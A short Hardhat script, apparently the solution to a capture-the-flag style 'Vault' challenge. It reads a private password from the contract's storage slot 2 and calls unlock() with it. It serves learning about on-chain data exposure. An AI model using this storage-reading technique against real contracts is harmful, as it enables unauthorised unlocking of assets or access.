import { ethers } from 'hardhat';

async function main() {
  const provider = ethers.provider;

  const problemAddress = "0x8E118cbEbB407BFa8Dd93E99F214bAb4B299Ea1a";
  const password = await provider.getStorageAt(problemAddress, 2);
  const vault = await ethers.getContractAt("Vault", problemAddress);
  await vault.unlock(password);
  const locked = await vault.locked();

  console.log(locked);
}

main().catch(err => {
  console.log(err);
  process.exitCode = 1;
})
